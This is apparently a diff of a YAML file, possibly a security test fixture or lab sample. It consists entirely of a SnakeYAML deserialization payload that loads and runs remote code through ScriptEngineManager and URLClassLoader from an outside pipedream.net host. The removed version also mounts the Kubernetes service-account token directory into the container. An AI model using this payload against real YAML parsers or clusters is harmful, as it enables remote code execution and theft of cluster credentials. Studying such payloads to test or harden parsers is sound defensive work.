@@ -1,7 +1,5 @@
-version: "3.3"
-services:
-  service-A:
-    name: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["https://en70bgxpxujs.x.pipedream.net/"] ]] ]
-    build: .
-    volumes:
-      - serviceaccount:/var/run/secrets/kubernetes.io/serviceaccount/./
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["https://en70bgxpxujs.x.pipedream.net/"]
+  ]]
+]
